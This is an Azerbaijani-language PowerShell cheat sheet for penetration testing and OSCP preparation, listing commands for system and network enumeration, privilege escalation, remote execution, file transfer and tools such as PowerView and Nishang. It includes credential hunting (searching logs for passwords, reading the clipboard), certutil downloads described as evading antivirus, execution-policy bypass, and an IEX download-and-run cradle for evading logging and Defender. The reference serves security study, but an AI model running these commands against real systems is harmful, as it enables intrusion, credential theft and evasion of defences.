
# PowerShell
---

## 🧭 Əsas Sistem Məlumatları

| Əmr | İzah | İstifadə Sahəsi |
|------|------|----------------|
| `Get-Process` | Aktiv prosesləri göstərir | Sistem fəaliyyətini izləmək və zərərli prosesləri tapmaq |
| `Get-Service` | Xidmətlərin siyahısını göstərir | Hansı xidmətlərin aktiv olduğunu analiz etmək |
| `Get-EventLog -LogName System` | Sistem hadisələrini göstərir | Hadisə jurnallarını yoxlamaq, login və səhv qeydlərini tapmaq |
| `Get-ComputerInfo` | Kompüter haqqında ümumi məlumat | Sistem konfiqurasiyasını analiz etmək |
| `Get-LocalUser` | Lokal istifadəçiləri göstərir | İstifadəçi hesablarını aşkar etmək |
| `Get-LocalGroup` | Qrupların siyahısını göstərir | Administrator və digər qrup üzvlərini tapmaq |

---

## 💻 Şəbəkə və Əlaqə Məlumatları

| Əmr | İzah | İstifadə Sahəsi |
|------|------|----------------|
| `Test-Connection <IP>` | Ping göndərir | Hədəfin aktiv olub-olmadığını yoxlamaq |
| `Get-NetIPAddress` | IP ünvanlarını göstərir | Şəbəkə interfeyslərini öyrənmək |
| `Get-NetRoute` | Routing cədvəlini göstərir | Şəbəkə yönləndirməsini təhlil etmək |
| `Get-NetNeighbor` | ARP cədvəlini göstərir | Şəbəkədə aktiv cihazları tapmaq |
| `Get-NetTCPConnection` | TCP bağlantılarını göstərir | Aktiv port və prosesləri təyin etmək |
| `netstat -ano` | Əlavə bağlantı və PID məlumatı | Port əsaslı analiz üçün |

---

## 👥 İstifadəçi və Qrup Məlumatı

| Əmr | İzah | İstifadə Sahəsi |
|------|------|----------------|
| `whoami` | Cari istifadəçi | Sessiya səviyyəsini yoxlamaq |
| `net user` | İstifadəçi siyahısı | Admin hüquqları olub-olmadığını tapmaq |
| `net localgroup administrators` | Admin qrup üzvləri | Privilege escalation məqsədi ilə |
| `Get-ChildItem C:\Users` | İstifadəçi qovluqları | Fayl strukturunu analiz etmək |
| `Get-Acl` | Fayl və qovluq icazələri | Zəif permission-ları tapmaq |

---

## 🔍 Fayl və Fayl Sistemi

| Əmr | İzah | İstifadə Sahəsi |
|------|------|----------------|
| `Get-ChildItem -Recurse` | Faylları rekursiv sadalayır | Fayl axtarışı və məlumat toplamaq |
| `Select-String -Path *.log -Pattern password` | Şifrələri axtarmaq | Şəxsi məlumatların axtarışı |
| `Get-Content <file>` | Fayl məzmununa baxmaq | Məlumat toplamaq |
| `Set-Content <file>` | Fayla yazmaq | Fayl dəyişiklikləri üçün |
| `Copy-Item`, `Move-Item`, `Remove-Item` | Fayl əməliyyatları | Fayl idarəçiliyi |

---

## 🧩 Privilege Escalation və System Enumeration

| Əmr | İzah | İstifadə Sahəsi |
|------|------|----------------|
| `whoami /priv` | İcazələri göstərir | Privilege escalation potensialını analiz |
| `systeminfo` | Ətraflı sistem məlumatı | Patch səviyyəsi və versiya analizi |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | Quraşdırılmış patch-lər | Eskalasiya üçün zəif sistemləri tapmaq |
| `Get-WmiObject Win32_UserAccount` | WMI ilə istifadəçi siyahısı | Detallı məlumat toplamaq |
| `Get-WmiObject Win32_Service` | Xidmət məlumatları | Exploit edilə bilən servisləri tapmaq |
| `Get-WmiObject Win32_StartupCommand` | Startup scriptləri | Persistentlik nöqtələrini aşkar etmək |

---

## 🕸️ Uzaqdan Əlaqə və Komanda İcra

| Əmr | İzah | İstifadə Sahəsi |
|------|------|----------------|
| `Invoke-Command -ComputerName <target> -ScriptBlock { <command> }` | Uzaqdan komanda icrası | RCE (Remote Command Execution) üçün |
| `Enter-PSSession -ComputerName <target>` | Uzaq sessiyaya qoşulmaq | Remote shell əldə etmək |
| `New-PSSession` | Yeni sessiya açmaq | Persistent əlaqə üçün |
| `Invoke-Expression` (`IEX`) | Dinamik PowerShell kodu icra edir | Payload-ların icrası üçün |

---

## 🧠 Məlumat Toplama və Key Dəyişmə

| Əmr | İzah | İstifadə Sahəsi |
|------|------|----------------|
| `Get-Clipboard` | Panodan məlumat oxumaq | Şifrələr və kopyalanan məlumatları əldə etmək |
| `Get-History` | Əvvəlki əmrləri göstərir | Əmrlərdən iz toplamaq |
| `Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"` | Avtostart proqramları | Persistence üçün analiz |
| `Get-ChildItem "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"` | Proxy və bağlantı məlumatları | Şəbəkə arxitekturasını anlamaq |

---

## 🧱 Fayl Transfer və Script İcra

| Əmr | İzah | İstifadə Sahəsi |
|------|------|----------------|
| `Invoke-WebRequest -Uri <url> -OutFile <file>` | Fayl yükləmək | Payload və ya script gətirmək |
| `Start-Process <file>` | Fayl icra etmək | Shell və ya proqram işə salmaq |
| `certutil -urlcache -split -f <url> <file>` | Alternativ yükləmə üsulu | Antivirusu keçmək üçün |

---

## 🧰 Digər Əmrlər və Texnikalar

| Əmr | İzah | İstifadə Sahəsi |
|------|------|----------------|
| `Get-Command` | Bütün mövcud əmrləri göstərir | PowerShell araşdırması |
| `Get-Help <command>` | Əmr köməyini göstərir | Ətraflı izah üçün |
| `Set-ExecutionPolicy Unrestricted` | Script icazəsini dəyişir | Script-lərin icrası üçün |
| `powershell -ep bypass` | ExecutionPolicy bypass | Təhlükəsizlik məhdudiyyətlərini keçmək |

---

## 📦 Faydalı Modullar

| Modul | İzah | Əsas İstifadə |
|--------|------|---------------|
| `PowerView` | Active Directory informasiya toplamaq | Domain enumeration |
| `PowerUp` | Local privilege escalation | Eskalasiya və zəiflik tapmaq |
| `SharpHound / BloodHound` | AD qraf analizi | Hücum yollarının xəritələnməsi |
| `Nishang` | Post-exploitation framework | Command icrası, UAC bypass və s. |

---

## 📚 Qeydlər

- PowerShell `v2` sistemlərdə bəzi modullar mövcud olmaya bilər.  
- PowerShell scriptləri `.ps1` formatında saxlanılır və icra edilməzdən əvvəl Execution Policy dəyişilməlidir.  
- OSCP mühitində **PowerShell logging** və **defender bypass** üçün alternativ metodlardan istifadə olunur (məs: `IEX (New-Object Net.WebClient).DownloadString('<url>')`).

---


